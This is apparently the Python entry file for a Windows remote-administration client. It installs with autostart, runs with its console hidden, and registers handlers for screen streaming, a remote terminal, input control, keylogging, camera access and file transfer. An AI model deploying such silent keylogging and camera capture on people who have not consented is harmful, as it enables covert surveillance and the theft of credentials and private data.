# -*- coding: utf-8 -*-
"""WinConsole 客户端入口：解析命令行参数、配置日志、创建引擎并运行。"""

import sys
import os

# ---- PyInstaller --noconsole 模式下的 console 可见性处理 ----
# 打包参数为 --noconsole（GUI subsystem），bootloader 根本不创建 console 窗口。
# 我们按需处理：
#   - 正常客户端运行（无参数 / --server）→ 静默（不分配 console）
#   - install / test / uninstall / --install / --uninstall → 主动 AllocConsole + 重定向 stdout/stderr
# 这样：
#   * 用户双击 / 自启动 / 任务计划启动客户端时 → 完全静默，没有 cmd 窗口闪烁
#   * 用户跑 install / test / uninstall 时 → 弹出 cmd 窗口显示输出
if getattr(sys, 'frozen', False) and os.name == 'nt':
    _argv = sys.argv[1:] if len(sys.argv) > 1 else []
    _first = _argv[0] if _argv else ''
    _SHOW_CONSOLE_CMDS = {
        'install', 'uninstall', 'test',
        '--install', '--uninstall', '-install', '-uninstall',
    }
    if _first in _SHOW_CONSOLE_CMDS:
        try:
            import ctypes
            # 1) 分配一个新的 console 窗口
            ctypes.windll.kernel32.AllocConsole()
            # 2) 把 stdout/stderr 重定向到新的 CONOUT$
            # --noconsole 模式下 sys.stdout / sys.stderr 通常是 None（GUI subsystem 没有 std handle），
            # 必须手动 open 'CONOUT$' 才能让 print() 输出到 console
            import io
            try:
                # 使用 open() 而不是 os.open + os.fdopen，避免 TextIOWrapper 层级问题
                sys.stdout = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
            except Exception:
                pass
            try:
                sys.stderr = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
            except Exception:
                pass
            # 3) 把控制台切到 UTF-8 代码页（让中文能正常显示）
            try:
                ctypes.windll.kernel32.SetConsoleOutputCP(65001)
                ctypes.windll.kernel32.SetConsoleCP(65001)
            except Exception:
                pass
            # 4) 主动 flush（避免缓冲）
            try:
                sys.stdout.flush()
            except Exception:
                pass
        except Exception:
            pass

import logging
import socket
import asyncio
import json
import traceback
import ssl
from pathlib import Path

# ---- 修复 PyInstaller --onefile 在 import 阶段注入 StreamHandler 导致的 Bad file descriptor ----
# PyInstaller --console 模式下会在 root logger 上挂一个无效的 StreamHandler，
# 任何 logger.info() 调用都会触发 OSError: [Errno 9] Bad file descriptor。
# 所以在 import 其他任何模块之前，先彻底清空 root logger 的所有 handler。
root_logger = logging.getLogger()
for h in list(root_logger.handlers):
    root_logger.removeHandler(h)
    try:
        if hasattr(h, 'close'):
            h.close()
    except Exception:
        pass
# 同时关掉 PyInstaller 的 propagate（避免重复触发）
logging.raiseExceptions = False

# 把 logging.Handler.handleError 替换为静默实现，
# 避免 handler 失败时 logging 自己又用 sys.stderr 报错（那才是 traceback 刷屏的元凶）。
def _silent_handle_error(self, record):
    """静默吞掉 logging 内部 handler 错误，不再向 stderr 打印 traceback。"""
    try:
        self.close()
    except Exception:
        pass
logging.Handler.handleError = _silent_handle_error
# ---- 修复 PyInstaller --onefile 把 stdout 强制改成 UTF-8 导致中文乱码 ----
# 主动把 Windows 控制台切到 UTF-8 代码页（65001）。
# PyInstaller --console 模式下 stdout/stderr 已经是 UTF-8 编码，
# 我们只需要告诉 cmd / PowerShell 以 UTF-8 解释输出字节，中文就能正常显示。
# 注意：不要重写 sys.stdout / sys.stderr（PyInstaller 的 buffer 已被包装，
# 强行新建 TextIOWrapper 会触发 [Errno 9] Bad file descriptor）。
if getattr(sys, 'frozen', False) and sys.stdout:
    try:
        if os.name == 'nt':
            import ctypes
            try:
                ctypes.windll.kernel32.SetConsoleOutputCP(65001)  # UTF-8 输出
                ctypes.windll.kernel32.SetConsoleCP(65001)        # UTF-8 输入
            except Exception:
                try:
                    os.system('chcp 65001 >nul 2>&1')
                except Exception:
                    pass
    except Exception:
        pass
# 添加项目根目录到 sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.config import *
from common.protocol import MsgType
from client.core import ClientEngine
from client.handlers import (handle_screen_stream, handle_process, handle_terminal,
                              handle_mouse, handle_keyboard, handle_keylog, handle_system_info,
                              handle_camera, handle_disk, handle_file_transfer,
                              handle_file_transfer_data, handle_file_manager)


def get_local_ip():
    """获取本机局域网 IP 地址。"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def _load_client_config(quiet=False):
    """从配置文件读取客户端连接配置。

    兼容多个可能的位置（按优先级）：
      1) ~/.winconsole-client/config.json   (install 写入的位置)
      2) ~/.winconsole/server_config.json    (旧版 / 服务端共享配置)
      3) 兜底: 127.0.0.1:9082 (WebSocket 端口)
    """
    result = {
        'server_addr': f'127.0.0.1:{DEFAULT_WS_PORT}',
        'auth_key': '',
        'tls_enabled': False,
        'tls_verify': True,
        'ca_cert': '',
    }
    candidates = [
        Path.home() / '.winconsole-client' / 'config.json',
        Path(SERVER_CONFIG_FILE),
    ]
    for config_file in candidates:
        if config_file.exists():
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    addr = config.get('server_addr', '')
                    if not addr and 'ws_port' in config:
                        addr = f"127.0.0.1:{config.get('ws_port', DEFAULT_WS_PORT)}"
                    if addr and not _looks_truncated(addr):
                        result['server_addr'] = addr
                        result['auth_key'] = config.get('auth_key', result['auth_key'])
                        result['tls_enabled'] = bool(config.get('tls_enabled', result['tls_enabled']))
                        result['tls_verify'] = bool(config.get('tls_verify', result['tls_verify']))
                        result['ca_cert'] = config.get('ca_cert', result['ca_cert'])
                        return result
            except Exception:
                pass
    if not quiet:
        print("未找到服务端地址配置，请使用 install -host ip -port port 安装，或 --server 指定地址")
    return result


def _load_server_addr():
    """从配置文件读取服务端地址。"""
    return _load_client_config()['server_addr']


def _looks_truncated(addr):
    """检测 server_addr 是否被 PowerShell 截断（典型情况：只剩 '127' 这种纯数字段）。

    PowerShell 5.x 会把 '127.0.0.1:9082' 中的冒号当驱动器分隔符截断，
    只把 '127' 传给程序。这里检测到这种异常时返回 True。
    """
    if not addr or ':' not in addr:
        return True
    host, port = addr.rsplit(':', 1)
    # 端口必须是数字
    if not port.isdigit():
        return True
    # host 不能是纯数字（127.0.0.1 也至少含点号）
    if host.isdigit():
        return True
    return False


def _parse_install_server_arg(args):
    """从 install / test 命令参数中解析服务端地址。

    支持以下形式（任选其一）：
      -server=ip:port
      --server=ip:port
      -server ip:port
      --server ip:port
      -host ip -port port        ★ PowerShell 友好（避开冒号截断问题）
      -h ip -p port

    解析失败时返回 None（由调用方决定如何处理）。
    """
    # 1) = 形式
    for arg in args:
        for prefix in ('-server=', '--server='):
            if arg.startswith(prefix):
                return arg.split('=', 1)[1].strip()
    # 2) 空格形式
    for i, arg in enumerate(args):
        if arg in ('-server', '--server') and i + 1 < len(args):
            return args[i + 1].strip()
    # 3) -host / -port 分离形式（PowerShell 友好，无冒号）
    host = None
    port = None
    i = 0
    while i < len(args):
        a = args[i]
        if a in ('-host', '--host', '-h') and i + 1 < len(args):
            host = args[i + 1]
            i += 2
            continue
        if a in ('-port', '--port', '-p') and i + 1 < len(args):
            port = args[i + 1]
            i += 2
            continue
        i += 1
    if host and port:
        return f'{host}:{port}'
    if host and not port:
        return f'{host}:{DEFAULT_WS_PORT}'
    # 4) 兜底默认值：WebSocket 端口（不是 HTTP 端口）
    return f'{DEFAULT_HOST}:{DEFAULT_WS_PORT}'


def _parse_value_arg(args, names, default=''):
    """解析 --name=value 或 --name value 形式的参数。"""
    for arg in args:
        for name in names:
            prefix = name + '='
            if arg.startswith(prefix):
                return arg.split('=', 1)[1].strip()

    for i, arg in enumerate(args):
        if arg in names and i + 1 < len(args):
            return args[i + 1].strip()

    return default


def _parse_auth_key_arg(args, default=''):
    """解析客户端注册认证密钥。"""
    return _parse_value_arg(args, ('-auth-key', '--auth-key', '-key', '--key'), default)


def _parse_tls_args(args, defaults=None):
    """解析 TLS 相关参数。"""
    defaults = defaults or {}
    tls_enabled = bool(defaults.get('tls_enabled', False))
    tls_verify = bool(defaults.get('tls_verify', True))
    ca_cert = defaults.get('ca_cert', '')

    if '--tls' in args or '-tls' in args:
        tls_enabled = True
    if '--no-tls' in args:
        tls_enabled = False
    if '--tls-insecure' in args or '--no-tls-verify' in args:
        tls_verify = False
    if '--tls-verify' in args:
        tls_verify = True

    ca_cert = _parse_value_arg(args, ('--ca-cert', '-ca-cert'), ca_cert)
    return tls_enabled, tls_verify, ca_cert


def _build_ws_uri(server_addr, tls_enabled):
    """构造 WebSocket URI。"""
    if server_addr.startswith(('ws://', 'wss://')):
        return server_addr
    return f"{'wss' if tls_enabled else 'ws'}://{server_addr}"


def _build_ssl_context_for_uri(uri, tls_verify=True, ca_cert=''):
    """为连接测试创建 SSL 上下文。"""
    if not uri.startswith('wss://'):
        return None
    if not tls_verify:
        return ssl._create_unverified_context()
    if ca_cert:
        return ssl.create_default_context(cafile=ca_cert)
    return ssl.create_default_context()


def _split_server_addr(server_addr, default_tls=False):
    """拆出主机和端口，支持 ip:port、ws://、wss://。"""
    if server_addr.startswith(('ws://', 'wss://')):
        from urllib.parse import urlparse
        parsed = urlparse(server_addr)
        return parsed.hostname or '', parsed.port or DEFAULT_WS_PORT

    if ':' not in server_addr:
        return server_addr, DEFAULT_WS_PORT

    host, port_str = server_addr.rsplit(':', 1)
    return host, int(port_str)


def _attach_console():
    """无操作占位：保留以兼容旧调用。当前构建为 --console，stdout/stderr 始终可用。"""
    return True


def _pause():
    """在 install/uninstall/test 结束时暂停，方便用户看清输出。

    多重兜底：
      1) msvcrt.getch() 直接读键（最干净）
      2) msvcrt.kbhit()+getch() 轮询（某些 PyInstaller --onefile 下 stdin 被重定向时）
      3) os.system('pause')（无 >NUL，确保 cmd 弹出 "请按任意键继续..."）
      4) 最后 sleep 8 秒兜底，保证窗口不会瞬间消失
    """
    if not getattr(sys, 'frozen', False):
        return
    if os.name != 'nt':
        return
    try:
        print("\n=== 完成，按任意键关闭窗口 ===", flush=True)
    except Exception:
        pass
    # 1) 直接 getch
    try:
        import msvcrt
        msvcrt.getch()
        return
    except Exception:
        pass
    # 2) kbhit + getch 轮询（最多 30s）
    try:
        import msvcrt, time as _t
        deadline = _t.time() + 30
        while _t.time() < deadline:
            try:
                if msvcrt.kbhit():
                    msvcrt.getch()
                    return
            except Exception:
                break
            _t.sleep(0.1)
        return
    except Exception:
        pass
    # 3) conhost pause
    try:
        os.system('pause')
        return
    except Exception:
        pass
    # 4) 兜底
    import time as _t
    _t.sleep(8)


def _hide_console_on_run():
    """客户端进入主循环时隐藏控制台窗口（--console 打包下需要手动隐藏）。

    仅当 exe 为 frozen 且当前是真正的客户端运行（非 install/uninstall/test）时调用。
    """
    if not getattr(sys, 'frozen', False):
        return
    if os.name != 'nt':
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass


def _setup_logging():
    """配置日志输出到文件和终端。"""
    log_dir = Path.home() / '.winconsole-client'
    log_dir.mkdir(exist_ok=True)
    log_file = log_dir / 'client.log'

    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(name)s] %(levelname)s: %(message)s',
        handlers=[
            logging.FileHandler(str(log_file), encoding='utf-8'),
            logging.StreamHandler(),
        ],
    )


def test_connection(server_addr, tls_enabled=False, tls_verify=True, ca_cert=''):
    """测试到服务端的网络连通性，结果逐行回显 + 写入 install.log。

    依次进行：
      1) DNS / 地址解析
      2) TCP 连接（最关键，能反映端口是否可达、服务是否在跑）
      3) 短超时 WebSocket 握手（验证协议层是否正常）

    返回 True 表示全部通过。

    重要：不要让 logging.StreamHandler 写 stderr（PyInstaller --onefile 下会 Bad file descriptor），
    控制台输出全部走 print()，logger 只写文件。
    """
    # 配置日志：只写文件，不写控制台
    log_dir = Path.home() / '.winconsole-client'
    try:
        log_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    log_file = log_dir / 'install.log'
    try:
        # 先清掉 root logger 的所有 handler（包括 PyInstaller 注入的）
        root = logging.getLogger()
        for h in list(root.handlers):
            root.removeHandler(h)
        root.setLevel(logging.INFO)
        fh = logging.FileHandler(str(log_file), encoding='utf-8')
        fh.setFormatter(logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s'))
        root.addHandler(fh)
    except Exception:
        pass
    log = logging.getLogger('client.test')

    def _emit(line):
        """同时输出到 print() 和 日志文件。

        print() 是控制台主要输出通道（已经能正常显示中文）。
        log.info() 把同一行写到 install.log 文件供事后排查。
        PyInstaller --onefile --console 下 logging.StreamHandler 可能
        触发 Bad file descriptor，所以用 try/except 完全吞掉 logging 异常。
        """
        try:
            print(line, flush=True)
        except Exception:
            pass
        try:
            log.info(line)
        except Exception:
            # 完全吞掉 logging 异常（不影响 print 输出）
            pass

    uri = _build_ws_uri(server_addr, tls_enabled)
    _emit(f"=== 测试连接: {uri} ===")
    _emit(f"本机 IP: {get_local_ip()}")

    try:
        host, port = _split_server_addr(server_addr)
    except ValueError:
        _emit(f"[FAIL] 地址格式错误: {server_addr}  (应为 ip:port)")
        return False

    # 1) 地址解析
    _emit(f"[1/3] 解析地址 {host} ...")
    try:
        infos = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
        resolved = infos[0][4][0]
        _emit(f"      -> OK  {resolved}")
    except Exception as e:
        _emit(f"      -> FAIL  ({e})")
        return False

    # 2) TCP 连接
    _emit(f"[2/3] TCP 连接 {host}:{port} ...")
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=5)
        _emit(f"      -> OK  (本地端口 {sock.getsockname()[1]})")
    except socket.timeout:
        _emit(f"      -> FAIL  (连接超时 5s)")
        return False
    except OSError as e:
        _emit(f"      -> FAIL  ({e})")
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    # 3) WebSocket 握手
    _emit(f"[3/3] WebSocket 握手 ...")
    try:
        import websockets
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        ws = None
        try:
            ws = loop.run_until_complete(
                asyncio.wait_for(
                    websockets.connect(
                        uri,
                        ssl=_build_ssl_context_for_uri(uri, tls_verify, ca_cert),
                    ),
                    timeout=5,
                )
            )
            _emit(f"      -> OK")
        finally:
            # 确保关闭 WebSocket
            if ws is not None:
                try:
                    loop.run_until_complete(ws.close())
                except Exception:
                    pass
            loop.close()
    except Exception as e:
        _emit(f"      -> FAIL  ({e})")
        return False

    _emit("=== 连接测试通过 ===")
    _emit(f"(详细日志: {log_file})")
    return True


def main():
    """客户端主入口。"""
    args = sys.argv[1:]

    # ---- 解析命令行参数 ----
    if not args:
        # 无参数：从配置文件读取服务端地址
        client_config = _load_client_config()
        server_addr = client_config['server_addr']
        auth_key = client_config.get('auth_key', '')
        tls_enabled = client_config.get('tls_enabled', False)
        tls_verify = client_config.get('tls_verify', True)
        ca_cert = client_config.get('ca_cert', '')

    elif args[0] == 'install':
        defaults = _load_client_config(quiet=True)
        # 检查是否有 -cmd 参数
        show_console = False
        for a in args[1:]:
            if a in ('-cmd', '--cmd'):
                show_console = True
                break
        
        # 只有加了 -cmd 参数才创建控制台窗口
        if show_console:
            _attach_console()
        
        # 解析服务端地址参数
        server_addr = _parse_install_server_arg(args)
        if not server_addr:
            if show_console:
                print("用法: WinConsoleClient install -server=ip:port -auth-key=密钥 [-cmd] [-no-test]")
                print("     或: WinConsoleClient install -host ip -port port -auth-key 密钥 [-cmd] [-no-test]")
                _pause()
            sys.exit(1)

        auth_key = _parse_auth_key_arg(args, defaults.get('auth_key', ''))
        tls_enabled, tls_verify, ca_cert = _parse_tls_args(args, defaults)
        if not auth_key and show_console:
            print("[WARN] 未提供 -auth-key，默认安全配置下客户端将无法完成注册。", flush=True)

        # 检测参数被 PowerShell 截断（如只剩 '127' 这种纯数字段）
        if _looks_truncated(server_addr):
            if show_console:
                print("=" * 60, flush=True)
                print("  [ERROR] 服务端地址格式异常:", server_addr, flush=True)
                print("  这通常是 PowerShell 把 'ip:port' 中的冒号当成了驱动器分隔符截断了参数。", flush=True)
                print("=" * 60, flush=True)
                print("  请用以下任一方式调用：", flush=True)
                print("    [方式 1] 用 cmd 运行（推荐）:", flush=True)
                print("        cmd /c WinConsoleClient.exe install -server=127.0.0.1:9082", flush=True)
                print("    [方式 2] PowerShell 中用引号包参数:", flush=True)
                print('        .\WinConsoleClient.exe install "-server=127.0.0.1:9082"', flush=True)
                print("    [方式 3] 用 -host -port 分离形式（无冒号）:", flush=True)
                print("        .\WinConsoleClient.exe install -host 127.0.0.1 -port 9082", flush=True)
                print("=" * 60, flush=True)
                # 如果之前已经错误安装了，主动清理损坏的 config
                cfg = Path.home() / '.winconsole-client' / 'config.json'
                if cfg.exists():
                    try:
                        cfg.unlink()
                        print("  [CLEAN] 已删除损坏的配置:", cfg, flush=True)
                    except Exception:
                        pass
                _pause()
            sys.exit(1)

        # 是否在 install 前先做一次连接测试（默认开）
        do_test = True
        for a in args[1:]:
            if a in ('-no-test', '--no-test'):
                do_test = False
                break

        # 先回显连接测试结果（满足"加个参数在命令行回显连接结果"的需求）
        if do_test and show_console:
            print("=" * 60, flush=True)
            print(f"  [Pre-Install] 测试连接到 {server_addr}", flush=True)
            print("=" * 60, flush=True)
            ok = test_connection(server_addr, tls_enabled, tls_verify, ca_cert)
            print("=" * 60, flush=True)
            if not ok:
                print("[WARN] 连接测试未通过，仍然继续安装（你可以用 uninstall 移除）", flush=True)
                print("       详细日志见: %s" % (Path.home() / '.winconsole-client' / 'install.log'),
                      flush=True)
                print("=" * 60, flush=True)
            print(flush=True)
        elif do_test:
            # 没有 -cmd 参数时，静默测试连接
            test_connection(server_addr, tls_enabled, tls_verify, ca_cert)

        try:
            from client.installer import install
            install(server_addr, auth_key=auth_key, tls_enabled=tls_enabled,
                    tls_verify=tls_verify, ca_cert=ca_cert)
        except Exception as e:
            if show_console:
                print(f"\n[ERROR] 安装失败: {e}")
                traceback.print_exc()
                print(f"\n详细日志: {Path.home() / '.winconsole-client' / 'install.log'}", flush=True)
                _pause()
            sys.exit(1)
        
        if show_console:
            print(f"\n详细日志: {Path.home() / '.winconsole-client' / 'install.log'}", flush=True)
            _pause()
        sys.exit(0)

    elif args[0] == 'uninstall':
        # 卸载客户端
        _attach_console()
        try:
            from client.installer import uninstall
            uninstall()
        except Exception as e:
            print(f"\n[ERROR] 卸载失败: {e}")
            traceback.print_exc()
            _pause()
            sys.exit(1)
        _pause()
        sys.exit(0)

    elif args[0] == 'test':
        defaults = _load_client_config(quiet=True)
        # 测试到服务端的连接
        _attach_console()
        if len(args) > 1:
            server_addr = _parse_install_server_arg(args)
        else:
            server_addr = f'{DEFAULT_HOST}:{DEFAULT_WS_PORT}'
        tls_enabled, tls_verify, ca_cert = _parse_tls_args(args, defaults)

        # 检测参数被 PowerShell 截断
        if _looks_truncated(server_addr):
            print("=" * 60, flush=True)
            print("  [ERROR] 服务端地址格式异常:", server_addr, flush=True)
            print("  PowerShell 把冒号当成了驱动器分隔符截断了参数。", flush=True)
            print("  请用引号包参数或 -host -port 形式，例如：", flush=True)
            print('    .\WinConsoleClient.exe test "-server=127.0.0.1:9082"', flush=True)
            print("    .\WinConsoleClient.exe test -host 127.0.0.1 -port 9082", flush=True)
            print("=" * 60, flush=True)
            _pause()
            sys.exit(1)

        ok = test_connection(server_addr, tls_enabled, tls_verify, ca_cert)
        _pause()
        sys.exit(0 if ok else 2)

    elif args[0] in ('--server', '-server', '--host', '-host'):
        defaults = _load_client_config(quiet=True)
        # 临时指定服务端地址
        if len(args) < 2:
            print("用法: winconsole-client --server ip:port")
            print("  或: winconsole-client --host ip --port port")
            sys.exit(1)
        # 支持 -server ip:port 和 --host ip --port port 两种
        server_addr = _parse_install_server_arg(args)
        if _looks_truncated(server_addr):
            print(f"[ERROR] 服务端地址格式异常: {server_addr}", flush=True)
            print('请用引号包参数: --server "ip:port" 或 --host ip --port port', flush=True)
            sys.exit(1)
        auth_key = _parse_auth_key_arg(args, defaults.get('auth_key', ''))
        tls_enabled, tls_verify, ca_cert = _parse_tls_args(args, defaults)

    else:
        print("用法:")
        print("  WinConsoleClient                                  启动客户端（从配置文件读取服务端地址）")
        print('  WinConsoleClient --server "ip:port" -auth-key=密钥  启动客户端（临时指定）')
        print('  WinConsoleClient install "-server=ip:port" -auth-key=密钥 [-cmd] [-no-test]')
        print('                                                    安装并注册自启动（默认静默，PowerShell 需要引号）')
        print("  WinConsoleClient install -host ip -port port -auth-key 密钥")
        print("  -cmd: 显示控制台窗口并输出安装进度")
        print("  -no-test: 跳过连接测试")
        print("  --tls: 使用 wss:// 连接服务端")
        print("  --tls-insecure: 使用 TLS 但不校验证书（仅适合自签名内网场景）")
        print("  --ca-cert path: 使用指定 CA 证书校验服务端")
        print("  WinConsoleClient uninstall                        卸载")
        print('  WinConsoleClient test "-server=ip:port"           测试到服务端的连接并回显')
        print("  WinConsoleClient test -host ip -port port         测试连接（无冒号）")
        sys.exit(1)

    # ---- 设置日志 ----
    _setup_logging()
    logger = logging.getLogger('client')
    logger.info("正在启动客户端，服务端地址: %s", server_addr)

    # ---- 隐藏控制台（--console 打包下需要手动隐藏，否则会一直显示黑窗） ----
    _hide_console_on_run()

    # ---- 创建引擎 ----
    engine = ClientEngine(server_addr, auth_key=auth_key, use_tls=tls_enabled,
                          tls_verify=tls_verify, ca_cert=ca_cert)

    # ---- 注册功能模块 handler ----
    engine.register_handler(MsgType.SCREENSHOT, handle_screen_stream)  # 屏幕流和单次截图
    engine.register_handler(MsgType.PROCESS, handle_process)
    engine.register_handler(MsgType.TERMINAL, handle_terminal)
    engine.register_handler(MsgType.MOUSE, handle_mouse)
    engine.register_handler(MsgType.KEYBOARD, handle_keyboard)
    engine.register_handler(MsgType.KEYLOG, handle_keylog)
    engine.register_handler(MsgType.SYSTEM_INFO, handle_system_info)
    engine.register_handler(MsgType.CAMERA, handle_camera)
    engine.register_handler(MsgType.DISK, handle_disk)
    engine.register_handler(MsgType.FILE_TRANSFER, handle_file_transfer)
    engine.register_handler(MsgType.FILE_TRANSFER_DATA, handle_file_transfer_data)
    engine.register_handler(MsgType.FILE_MANAGER, handle_file_manager)

    # ---- 运行 ----
    try:
        asyncio.run(engine.run())
    except KeyboardInterrupt:
        logger.info("用户中断，正在停止...")
        asyncio.run(engine.stop())


if __name__ == '__main__':
    main()
